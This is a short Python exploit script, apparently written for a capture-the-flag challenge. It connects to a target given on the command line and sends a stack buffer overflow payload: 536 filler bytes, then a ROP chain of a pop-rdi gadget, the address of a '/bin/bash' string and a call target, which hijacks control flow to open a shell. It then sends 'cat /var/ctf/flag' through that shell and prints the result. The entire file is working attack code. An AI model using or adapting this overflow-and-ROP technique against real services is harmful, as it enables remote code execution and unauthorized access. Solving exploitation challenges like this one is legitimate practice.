#!/usr/bin/env python

from socket import *
from struct import pack
from time import sleep
import sys

HOST = sys.argv[1]
PORT = int(sys.argv[2])
BUFSIZE = 2048
ADDR = (HOST, PORT)

s = socket(AF_INET, SOCK_STREAM)
try:
	s.connect(ADDR)
except Exception as e:
	print('Cannot connect to the server.')
	sys.exit()

s.recv(BUFSIZE)

poprdi = 0x0000000000403a73
binbash = 0x403e5c

payload = ""
payload += "A"*536
payload += pack('<Q', poprdi)
payload += pack('<Q', binbash)
payload += pack('<Q', 0x401000)

s.send(payload + '\n')
sleep(1)
s.send("cat /var/ctf/flag\n")
sleep(1)
flag = s.recv(BUFSIZE)
flag = flag.rstrip()
sys.stdout.write(flag)
